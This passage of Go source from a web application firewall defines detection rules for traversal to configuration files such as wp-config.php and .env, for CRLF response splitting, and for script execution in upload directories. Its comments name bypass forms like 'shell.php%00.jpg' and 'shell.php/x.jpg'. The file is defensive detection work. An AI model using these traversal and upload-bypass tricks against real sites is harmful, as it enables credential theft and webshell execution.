				}
			}
		}
		return false
		// The hint is the *extension*, not the scheme, and the difference is
		// measurable. Both halves must be present for the predicate to fire, so
		// either could serve as the literal — but "http://" appears in a large
		// share of ordinary JSON bodies (callbacks, avatars, canonical links),
		// which would make this rule a prefilter candidate on traffic that has
		// no chance of matching. The extensions are rare in benign values, so
		// the automaton discards those requests before the predicate runs.
		//
		// Same rule, same matches, one fewer reason to wake up.
	}).WithLiterals(
		".php", ".phtml", ".php3", ".php4", ".php5", ".php7", ".phps",
		".inc", ".jsp", ".jspx", ".asp", ".aspx", ".cfm", ".cgi",
	)
}

// configFileTraversal reports a relative traversal that ends at an application
// configuration file.
//
// The conjunction is the rule. "../" alone is an ordinary relative path and the
// filename alone is an ordinary noun; only the pair says "read me the database
// credentials". Requiring both is what lets this ship at Certain next to a
// corpus that contains "../shared/2026/q3-summary.pdf" and a code-review
// comment about wp-config.php.
func configFileTraversal() rules.Operator {
	names := []string{
		"wp-config.php", "configuration.php", "config.php", "settings.php",
		"config.inc.php", "database.php", "local.xml", "parameters.yml",
		".env", "web.config", "app.config", "settings.py", "secrets.yml",
	}
	return op.Func("config_file_traversal", func(v []byte) bool {
		// A traversal segment has to be present. pathChain has already
		// normalised separators and case.
		hasDotDot := false
		for i := 0; i+2 < len(v); i++ {
			if v[i] == '.' && v[i+1] == '.' && (v[i+2] == '/' || v[i+2] == '\\') {
				hasDotDot = true
				break
			}
		}
		if !hasDotDot {
			return false
		}
		for _, n := range names {
			if indexOf(v, n) >= 0 {
				return true
			}
		}
		return false
	}).WithLiterals(names...)
}

// indexOf is a small substring search over a byte view, kept here so the hot
// path does not convert to string.
func indexOf(hay []byte, needle string) int {
	if len(needle) == 0 || len(hay) < len(needle) {
		return -1
	}
	for i := 0; i+len(needle) <= len(hay); i++ {
		if hay[i] != needle[0] {
			continue
		}
		if string(hay[i:i+len(needle)]) == needle {
			return i
		}
	}
	return -1
}

// CRLFHeaderRule reports a line break followed by a header name in a request
// value — response splitting, where the value is reflected into a response
// header and terminates it early so everything after the break is a header the
// attacker wrote.
//
// It is not in the default ruleset, and the reason is latency rather than
// precision. Every other rule reads values through a chain that strips
// whitespace; this one cannot, because the line break *is* the attack. A
// transform chain no other rule shares gets materialised over every value of
// every request, and measuring it was unambiguous: benign POST JSON with a 1
// KiB body ran at 15.4µs with this rule in core and 14.2µs without, against a
// 15µs SLO. One rule may not spend 8% of the budget on requests it cannot
// match.
//
// Opt in where the origin reflects request values into response headers —
// redirect targets, Location, Set-Cookie, custom correlation headers:
//
//	waf, err := gwaf.New(gwaf.WithRuleset(
//	    rules.Set{core.CRLFHeaderRule(1007)},
//	))
//
// Most Go services do not need it: net/http rejects a header value containing
// CR or LF outright, so the origin cannot be split. It matters most in front of
// PHP, older Java stacks, and anything writing headers by string concatenation.
func CRLFHeaderRule(id types.RuleID) rules.Rule {
	return rules.Rule{
		ID:      id,
		Phase:   types.PhaseRequestHeaders,
		Targets: argTargets,
		// URL-decoded and lowercased but never whitespace-stripped: a chain
		// that removes the line break removes the evidence.
		Transforms: []rules.Transform{transform.URLDecode, transform.Lowercase},
		Op:         crlfHeaderInjection(),
		Actions:    []rules.Action{rules.Block},
		Severity:   types.SeverityCritical,
		Confidence: types.Certain,
		Msg:        "CRLF header injection in request value",
		Tags:       []string{"response-splitting", "crlf", "owasp-a03", "opt-in"},
	}
}

// scriptInUploadPath reports a request for a script inside a directory whose
// purpose is user-supplied content.
//
// Both halves are required, and the conjunction is what makes the rule safe.
// The directory alone is ordinary — every site serves images out of its upload
// folder. The extension alone is ordinary too — WordPress is PHP, and blocking
// requests for PHP files would block WordPress. Only together do they describe
// a file the site accepted as data and is now being asked to run.
//
// The extension is taken from the end of the path, after pathChain has decoded
// and normalised it, so "shell.php%00.jpg" and "shell.php." resolve the way the
// interpreter will rather than the way a suffix check hopes.
func scriptInUploadPath() rules.Operator {
	// Directories that exist to hold uploads, across the stacks that get
	// compromised this way. Not an attempt at completeness: an embedder whose
	// upload directory is named something else adds a rule, and the point of
	// this one is to cover the defaults that ship in the wild.
	dirs := []string{
		"/wp-content/uploads/", "/wp-content/upgrade/", "/wp-content/cache/",
		"/uploads/", "/upload/", "/userfiles/", "/media/uploads/",
		"/sites/default/files/", "/assets/uploads/", "/storage/uploads/",
		"/public/uploads/", "/static/uploads/", "/attachments/", "/avatars/",
	}
	// Extensions an interpreter will execute. ".phar" is included because
	// reaching one deserializes its metadata, which is code execution without
	// ever being "a script" in the sense a filter usually means.
	exts := []string{
		".php", ".php3", ".php4", ".php5", ".php7", ".php8", ".phps",
		".phtml", ".pht", ".phar", ".inc",
		".jsp", ".jspx", ".jsw", ".asp", ".aspx", ".ashx", ".asmx",
		".cgi", ".pl", ".py", ".rb", ".sh",
	}
	return op.Func("script_in_upload_path", func(v []byte) bool {
		inUpload := false
		for _, d := range dirs {
			if indexOf(v, d) >= 0 {
				inUpload = true
				break
			}
		}
		if !inUpload {
			return false
		}
		// Cut the query string: the path is what selects the handler.
		path := v
		for i := 0; i < len(path); i++ {
			if path[i] == '?' || path[i] == '#' {
				path = path[:i]
				break
			}
		}
		// A trailing dot or space is stripped by the filesystem on the platforms
		// where this bypass works, so strip it here too before matching.
		for len(path) > 0 && (path[len(path)-1] == '.' || path[len(path)-1] == ' ') {
			path = path[:len(path)-1]
		}
		for _, e := range exts {
			if len(path) >= len(e) && string(path[len(path)-len(e):]) == e {
				return true
			}
			// "shell.php/x.jpg" executes as PHP under path-info handling, so an
			// extension followed by a separator counts as well.
			if i := indexOf(path, e+"/"); i >= 0 {
				return true
			}
		}
		return false
	}).WithLiterals(dirs...)
}

// WordPressHardeningRule blocks direct execution of any PHP file under
// wp-content — plugins and themes included, not just uploads.
//
// It is not in the default ruleset because it is not universally safe. Core
// rule 1010 covers the upload directories, where execution is never intended by
// anyone; this goes further and blocks the whole content tree, which is the
// hardening every WordPress security guide recommends and which a minority of
// plugins genuinely break under. Those plugins expose an endpoint by having the
// browser request their PHP file directly instead of routing through
// index.php — discouraged for a decade, still shipped.
//
// The trade is worth stating plainly, because it is the difference between a
// site that survives a plugin vulnerability and one that does not. WordPress
// itself never needs a direct request to a file under wp-content: the front
// controller is index.php and admin-ajax.php is under wp-admin. If nothing on
// the site breaks in staging with this on, leave it on.
//
//	waf, err := gwaf.New(gwaf.WithRuleset(
//	    rules.Set{core.WordPressHardeningRule(1011)},
//	))
//
// Only the extra rule: WithRuleset accumulates onto the default set rather than
// replacing it.
func WordPressHardeningRule(id types.RuleID) rules.Rule {
	return rules.Rule{
		ID:         id,
		Phase:      types.PhaseRequestHeaders,
		Targets:    []types.Target{{Kind: types.TargetRequestURI}},
		Transforms: pathChain,
		Op:         phpUnderWPContent(),
		Actions:    []rules.Action{rules.Block},
		Severity:   types.SeverityCritical,
		Confidence: types.High,
		Msg:        "Direct PHP execution under wp-content",
		Tags:       []string{"rce", "webshell", "wordpress", "opt-in"},
	}
}

// phpUnderWPContent reports a request for a PHP file anywhere under wp-content.
func phpUnderWPContent() rules.Operator {
	exts := []string{".php", ".php3", ".php4", ".php5", ".php7", ".php8",
		".phps", ".phtml", ".pht", ".phar", ".inc"}
	return op.Func("php_under_wp_content", func(v []byte) bool {
		if indexOf(v, "/wp-content/") < 0 {
			return false
		}
		path := v
		for i := 0; i < len(path); i++ {
			if path[i] == '?' || path[i] == '#' {
				path = path[:i]
				break
			}
		}
		for len(path) > 0 && (path[len(path)-1] == '.' || path[len(path)-1] == ' ') {
			path = path[:len(path)-1]
		}
		for _, e := range exts {
			if len(path) >= len(e) && string(path[len(path)-len(e):]) == e {
				return true
			}
			if indexOf(path, e+"/") >= 0 {
				return true
			}
		}
		return false
	}).WithLiterals("/wp-content/")
}
